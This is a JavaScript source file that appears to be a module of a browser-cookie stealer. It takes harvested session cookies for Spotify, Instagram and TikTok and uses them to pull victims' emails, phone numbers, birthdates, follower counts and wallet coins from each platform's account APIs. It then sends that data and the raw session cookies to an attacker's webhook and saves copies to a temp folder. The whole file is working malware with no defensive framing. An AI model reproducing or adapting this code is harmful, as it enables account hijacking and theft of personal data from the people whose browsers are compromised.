const axios = require('axios');

const structures = require('./structures.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const program = require('./../../utils/program/program.js');

const BrowserStats = structures.BrowserStatistics;

const Spotify = async (webhookUrl) => {
  const cookies = BrowserStats.cookies.filter((cookie) => cookie.host_key === '.spotify.com' && cookie.name === 'sp_dc');

  if (cookies.length === 0) return;

  for (const cookie of cookies) {
    try {
      if (Math.floor(Date.now() / 1000) > cookie.expires_utc) return;

      const response = await axios.get('https://www.spotify.com/api/account-settings/v1/profile', {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
          Cookie: `sp_dc=${cookie.value}`,
        },
      });
      const profile = response.data.profile || {};
      const { birthdate = 'Not Found', username = 'Not Found', country = 'Not Found', gender = 'Not Found', email = 'Not Found' } = profile;

      const full_profile = {
        birthdate: birthdate,
        username: username,
        country: country,
        gender: gender,
        email: email,
      };

      const data = {
        embeds: [
          {
            title: 'New Session Detected',
            author: {
              name: 'Spotify Session',
              icon_url: 'https://i.imgur.com/RL8Y2R8.png',
            },
            fields: [
              {
                name: 'Username',
                value: '`' + full_profile.username + '`',
                inline: true,
              },
              {
                name: 'Birthdate',
                value: '`' + full_profile.birthdate + '`',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Gender',
                value: '`' + full_profile.gender + '`',
                inline: true,
              },
              {
                name: 'Email',
                value: '`' + full_profile.email + '`',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Country',
                value: '`' + full_profile.country + '`',
                inline: true,
              },
              {
                name: 'Spotify Profile',
                value: '[`' + 'View profile' + '`](https://open.spotify.com/user/' + full_profile.username + ')',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Spotify Cookie',
                value: '```' + ('sp_dc=' + cookie.value) + '```',
                inline: false,
              },
            ],
          },
        ],
      };

      await program.Delay(1000);
      await requests.Webhook(webhookUrl, data);

      const spotifyInfo = [`Username: ${full_profile.username}`, `Birthdate: ${full_profile.birthdate}`, `Gender: ${full_profile.gender}`, `Email: ${full_profile.email}`, `Country: ${full_profile.country}`, `Spotify Profile: https://open.spotify.com/user/${full_profile.username}`, `Spotify Cookie: ${'sp_dc=' + cookie.value}`];

      const WishTempDir = fileutil.WishTempDir('sessions');
      await fileutil.WriteDataToFile(WishTempDir, `spotifyInfo-${program.RandString(10)}.txt`, spotifyInfo);
    } catch (error) {
      console.error(error);
    }
  }
};

const Instagram = async (webhookUrl) => {
  const cookies = BrowserStats.cookies.filter((cookie) => cookie.host_key === '.instagram.com' && cookie.name === 'sessionid');

  if (cookies.length === 0) return;

  for (const cookie of cookies) {
    try {
      if (Math.floor(Date.now() / 1000) > cookie.expires_utc) return;

      const userResponse = await axios.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', {
        headers: {
          Host: 'i.instagram.com',
          'X-Ig-Connection-Type': 'WiFi',
          'X-Ig-Capabilities': '36r/Fx8=',
          'Accept-Encoding': 'gzip, deflate',
          'X-Ig-App-Locale': 'en',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': 'Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+',
          'X-Mid': 'Ypg64wAAAAGXLOPZjFPNikpr8nJt',
          Cookie: `sessionid=${cookie.value};`,
        },
      });
      const user = userResponse.data.user || {};
      const { profile_pic_url = 'Not Found', phone_number = 'Not Found', is_verified = 'Not Found', username = 'Not Found', birthday = 'Not Found', email = 'Not Found', pk = null } = user;

      const profileResponse = await axios.get(`https://i.instagram.com/api/v1/users/${pk}/info`, {
        headers: {
          Host: 'i.instagram.com',
          'User-Agent': 'Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+',
          Cookie: `sessionid=${cookie.value};`,
        },
      });
      const profile = profileResponse.data.user || {};
      const { whatsapp_number = 'Not Found', follower_count = 0 } = profile;

      const full_profile = {
        whatsapp_number: whatsapp_number,
        profile_pic_url: profile_pic_url,
        follower_count: follower_count,
        phone_number: phone_number,
        is_verified: is_verified,
        username: username,
        birthday: birthday,
        email: email,
      };

      const data = {
        embeds: [
          {
            title: 'New Session Detected',
            author: {
              name: 'Instagram Session',
              icon_url: 'https://i.imgur.com/tpysV3g.png',
            },
            thumbnail: {
              url: full_profile.profile_pic_url,
            },
            fields: [
              {
                name: 'Username',
                value: '`' + full_profile.username + '`',
                inline: true,
              },
              {
                name: 'Birthdate',
                value: '`' + full_profile.birthday + '`',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Verified Account',
                value: '`' + (full_profile.is_verified ? '✅' : '❌') + '`',
                inline: true,
              },
              {
                name: 'Followers',
                value: '`' + full_profile.follower_count + '`',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Phone Number Whatsapp',
                value: '`' + (full_profile.whatsapp_number.length === 0 ? 'Not Found' : full_profile.whatsapp_number) + '`',
                inline: true,
              },
              {
                name: 'Phone Number',
                value: '`' + full_profile.phone_number + '`',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Email',
                value: '`' + full_profile.email + '`',
                inline: true,
              },
              {
                name: 'Instagram Profile',
                value: '[`' + 'View profile' + '`](https://www.instagram.com/' + full_profile.username + ')',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Instagram Cookie',
                value: '```' + ('sessionid=' + cookie.value) + '```',
                inline: false,
              },
            ],
          },
        ],
      };

      await program.Delay(1000);
      await requests.Webhook(webhookUrl, data);

      const instagramInfo = [`Username: ${full_profile.username}`, `Birthdate: ${full_profile.birthday}`, `Verified Account: ${full_profile.is_verified ? '✅' : '❌'}`, `Followers: ${full_profile.follower_count}`, `Phone Number Whatsapp: ${full_profile.whatsapp_number.length === 0 ? 'Not Found' : full_profile.whatsapp_number}`, `Phone Number: ${full_profile.phone_number}`, `Email: ${full_profile.email}`, `Instagram Profile: https://www.instagram.com/${full_profile.username}`, `Instagram Cookie: ${'sessionid=' + cookie.value}`];

      const WishTempDir = fileutil.WishTempDir('sessions');
      await fileutil.WriteDataToFile(WishTempDir, `instagramInfo-${program.RandString(10)}.txt`, instagramInfo);
    } catch (error) {
      console.error(error);
    }
  }
};

const Tiktok = async (webhookUrl) => {
  const cookies = BrowserStats.cookies.filter((cookie) => cookie.host_key === '.tiktok.com' && cookie.name === 'sessionid');

  if (cookies.length === 0) return;

  for (const cookie of cookies) {
    try {
      if (Math.floor(Date.now() / 1000) > cookie.expires_utc) return;

      const userResponse = await axios.get('https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE', {
        headers: {
          accept: 'application/json, text/plain, */*',
          'accept-encoding': 'gzip, compress, deflate, br',
          Cookie: `sessionid=${cookie.value};`,
        },
      });
      const user = userResponse.data.data || {};
      const { screen_name = 'Not Found', create_time = 'Not Found', user_id_str = 'Not Found', avatar_url = 'Not Found', username = 'Not Found', email = 'Not Found' } = user;

      const webcastResponse = await axios.get('https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true', {
        headers: {
          Cookie: `sessionid=${cookie.value};`,
        },
      });
      const webcast = webcastResponse.data.data || {};
      const { coins = 'Not Found' } = webcast;

      const insightsResponse = await axios.post('https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE', `type_requests=${JSON.stringify([{ insigh_type: 'user_live_cnt_history', days: 58 }, { insigh_type: 'follower_num_history', days: 17 }, { insigh_type: 'comment_history', days: 16 }, { insigh_type: 'week_new_videos', days: 7 }, { insigh_type: 'share_history', days: 16 }, { insigh_type: 'like_history', days: 16 }, { insigh_type: 'vv_history', days: 16 }, { insigh_type: 'pv_history', days: 16 }, { insigh_type: 'self_rooms', days: 28 }, { insigh_type: 'week_incr_video_num' }, { insigh_type: 'follower_num' }, { insigh_type: 'user_info' }, { insigh_type: 'room_info' }])}`, {
        headers: {
          Cookie: `sessionid=${cookie.value};`,
        },
      });
      const insights = insightsResponse.data.follower_num || {};
      const { value = 'Not Found' } = insights;

      const full_profile = {
        screen_name: screen_name,
        user_id_str: user_id_str,
        create_time: create_time,
        avatar_url: avatar_url,
        insights_value: value,
        wallet_coins: coins,
        username: username,
        email: email,
      };

      const data = {
        embeds: [
          {
            title: 'New Session Detected',
            author: {
              name: 'Tiktok Session',
              icon_url: 'https://cdn-icons-png.flaticon.com/512/4782/4782345.png',
            },
            thumbnail: {
              url: full_profile.avatar_url,
            },
            fields: [
              {
                name: 'Username',
                value: '`' + full_profile.username + '`',
                inline: true,
              },
              {
                name: 'Screen Name',
                value: '`' + full_profile.screen_name + '`',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'ID',
                value: '`' + full_profile.user_id_str + '`',
                inline: true,
              },
              {
                name: 'Account Creation',
                value: '<t:' + full_profile.create_time + '>',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Wallet Coins',
                value: '`' + full_profile.wallet_coins + '`',
                inline: true,
              },
              {
                name: 'Followers',
                value: '`' + full_profile.insights_value + '`',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Email',
                value: '`' + full_profile.email + '`',
                inline: true,
              },
              {
                name: 'Tiktok Profile',
                value: '[`' + 'View profile' + '`](https://tiktok.com/@' + full_profile.username + ')',
                inline: true,
              },
              { name: '\u200b', value: '\u200b', inline: false },
              {
                name: 'Tiktok Cookie',
                value: '```' + ('sessionid=' + cookie.value) + '```',
                inline: false,
              },
            ],
          },
        ],
      };

      await program.Delay(1000);
      await requests.Webhook(webhookUrl, data);

      const tiktokInfo = [`Username: ${full_profile.username}`, `ID: ${full_profile.user_id_str}`, `Account Creation: ${full_profile.create_time}`, `Wallet Coins: ${full_profile.wallet_coins}`, `Followers: ${full_profile.insights_value}`, `Email: ${full_profile.email}`, `Tiktok Profile: https://tiktok.com/@${full_profile.username}`, `Tiktok Cookie: ${'sessionid=' + cookie.value}`];

      const WishTempDir = fileutil.WishTempDir('sessions');
      await fileutil.WriteDataToFile(WishTempDir, `tiktokInfo-${program.RandString(10)}.txt`, tiktokInfo);
    } catch (error) {
      console.error(error);
    }
  }
};

module.exports = async (webhookUrl) => {
  await Spotify(webhookUrl);
  await Instagram(webhookUrl);
  await Tiktok(webhookUrl);
};
